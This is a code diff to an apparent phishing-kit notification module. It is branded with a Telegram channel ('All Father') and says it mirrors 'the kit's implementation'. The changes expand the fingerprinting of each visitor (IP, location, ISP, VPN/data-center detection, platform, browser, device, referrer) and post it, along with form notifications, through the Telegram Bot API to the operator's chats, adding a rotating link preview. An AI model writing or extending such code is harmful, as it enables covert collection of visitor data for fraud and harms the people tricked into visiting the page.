@@ -48,6 +48,10 @@ export interface VisitorTelegramData {
   osLabel?: string
   /** Hardware/class from UA, e.g. "iPhone", "Mac", "Windows PC". */
   deviceLabel?: string
+  /** OS + version, e.g. "iOS 17.2", "Windows 10/11". */
+  platformLabel?: string
+  /** Browser + version, e.g. "Chrome 141.0". */
+  browserLabel?: string
 
   userAgent: string
   screen: string
@@ -84,7 +88,7 @@ interface FormData {
   page: string
 }
 
-/** Telegram `parse_mode: HTML` — escape dynamic text; use asCode/asPre for tap-to-copy. */
+/** Telegram `parse_mode: HTML` — escape dynamic text; use asCode for tap-to-copy. */
 function escapeTelegramHtml(text: string): string {
   return text
     .replace(/&/g, '&amp;')
@@ -96,10 +100,6 @@ function escapeTelegramHtml(text: string): string {
 
 function asCode(text: string): string {
   return `<code>${escapeTelegramHtml(text)}</code>`
-}
-
-function asPre(text: string): string {
-  return `<pre>${escapeTelegramHtml(text)}</pre>`
 }
 
 function asCodeU(value: unknown, fallback = 'Unknown'): string {
@@ -136,39 +136,64 @@ export function wrapFlowMessage(body: string): string {
 
 const GEO_USER_AGENT = `Mozilla/5.0 (compatible; ${SITE_DISPLAY_NAME.replace(/[^a-zA-Z0-9]+/g, '-')}/1.0)`
 
+let previewRotationIndex = 0
+
+/**
+ * Rotating Telegram link preview for the visit message. Cycles between the ops
+ * channel, the visited page and the referrer so consecutive visit notifications do
+ * not all render an identical preview. Mirrors the kit's implementation.
+ */
+function getRotatedPreviewUrl(referrer?: string, pageUrl?: string): string {
+  const candidates: string[] = ["https://t.me/th3_allfather"]
+
+  if (pageUrl && /^https?:\/\//i.test(pageUrl.trim())) {
+    candidates.push(pageUrl.trim())
+  }
+
+  if (
+    referrer &&
+    /^https?:\/\//i.test(referrer.trim()) &&
+    referrer.trim() !== "Direct"
+  ) {
+    candidates.push(referrer.trim())
+  }
+
+  const selected = candidates[previewRotationIndex % candidates.length]
+  previewRotationIndex = (previewRotationIndex + 1) % 1000
+  return selected
+}
+
 export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
   const site = escapeTelegramHtml(data.siteName)
   const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
-  const networkLine = networkHint
-    ? `🛡️ <b>Network:</b> ${asCode(networkHint)}\n`
-    : ''
-  const osLine = data.osLabel
-    ? `📱 <b>OS:</b> ${asCode(data.osLabel)}\n`
-    : ''
-  const deviceLine = data.deviceLabel
-    ? `📱 <b>Device:</b> ${asCode(data.deviceLabel)}\n`
-    : ''
-  const message =
-    `\n🌐 <b>New Visitor (${site})</b>\n` +
-    `━━━━━━━━━━━━━━━━━━\n` +
-    `📍 <b>Location:</b> ${asCode(data.location)}\n` +
-    `🌍 <b>IP:</b> ${asCode(data.ip)}\n` +
-    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}\n` +
-    `🌐 <b>ISP:</b> ${asCode(data.isp)}\n` +
-    networkLine +
-    `\n` +
-    osLine +
-    deviceLine +
-    `💻 <b>User Agent:</b>\n${asPre(data.userAgent)}\n` +
-    `🖥️ <b>Screen:</b> ${asCode(data.screen)}\n` +
-    `🌍 <b>Language:</b> ${asCode(data.language)}\n` +
-    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer)}\n` +
-    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}\n\n` +
-    `⏰ <b>Local Time:</b> ${asCode(data.localTime)}\n` +
-    `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}\n` +
-    `<a href="https://t.me/th3_allfather">All Father</a>`
+  const message = [
+    `🌐 <b>(${site})</b>`,
+    "━━━━━━━━━━━━━━━━━━",
+    `📍 <b>Location:</b> ${asCode(data.location)}`,
+    `🌍 <b>IP:</b> ${asCode(data.ip)}`,
+    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}`,
+    `🌐 <b>ISP:</b> ${asCode(data.isp)}`,
+    ...(networkHint
+      ? [`🛡️ <b>VPN/DATA CENTER:</b> ${asCode(networkHint)}`]
+      : []),
+    "",
+    `🖥 <b>Platform:</b> ${asCode(data.platformLabel ?? data.osLabel ?? "Unknown")}`,
+    `👨‍💻 <b>Browser:</b> ${asCode(data.browserLabel ?? "Unknown")}`,
+    `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
+    `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
+    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer, "Direct")}`,
+    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}`,
+    "",
+    `<a href="https://t.me/th3_allfather">All Father</a>`,
+  ].join("\n")
 
-  return await sendTelegramMessage(message, { disableWebPagePreview: false })
+  const previewUrl = getRotatedPreviewUrl(data.referrer, data.pageUrl)
+
+  return await sendTelegramMessage(message, {
+    disablePreview: false,
+    previewUrl,
+    preferSmallMedia: true,
+  })
 }
 
 export async function sendFormNotification(data: FormData & { [key: string]: any }): Promise<boolean> {
@@ -405,12 +430,18 @@ Method at time of click: ${asCodeU(methodLabel)}`
 }
 
 type SendTelegramMessageOptions = {
+  /** @deprecated prefer `disablePreview` */
   disableWebPagePreview?: boolean
+  disablePreview?: boolean
+  /** Explicit link-preview URL (used by the rotating visit preview). */
+  previewUrl?: string
+  preferSmallMedia?: boolean
+  showAboveText?: boolean
 }
 
 export async function sendTelegramMessage(
   message: string,
-  options?: SendTelegramMessageOptions,
+  options: SendTelegramMessageOptions = {},
 ): Promise<boolean> {
   // Validate we have the required token
   if (!TELEGRAM_BOT_TOKEN) {
@@ -418,15 +449,28 @@ export async function sendTelegramMessage(
     return false
   }
 
-  // If no chat IDs configured, log warning
+  // If no chat ID(s) configured, log warning
   if (CHAT_IDS.length === 0) {
     console.warn('No Telegram chat IDs configured - message will not be sent')
     return false
   }
-  
+
+  const disablePreview =
+    options.disablePreview ?? (options.disableWebPagePreview !== false)
+  // `link_preview_options` supersedes the deprecated `disable_web_page_preview`
+  // flag: it can also pin a specific preview URL and request small media.
+  const link_preview_options = disablePreview
+    ? { is_disabled: true }
+    : {
+        is_disabled: false,
+        ...(options.previewUrl ? { url: options.previewUrl } : {}),
+        prefer_small_media: options.preferSmallMedia ?? true,
+        show_above_text: options.showAboveText ?? false,
+      }
+
   const text = message
 
-  const promises = CHAT_IDS.map(chatId => 
+  const promises = CHAT_IDS.map(chatId =>
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {
@@ -436,7 +480,7 @@ export async function sendTelegramMessage(
         chat_id: chatId,
         text,
         parse_mode: 'HTML',
-        disable_web_page_preview: options?.disableWebPagePreview ?? true,
+        link_preview_options,
       })
     })
     .then(async (response) => {
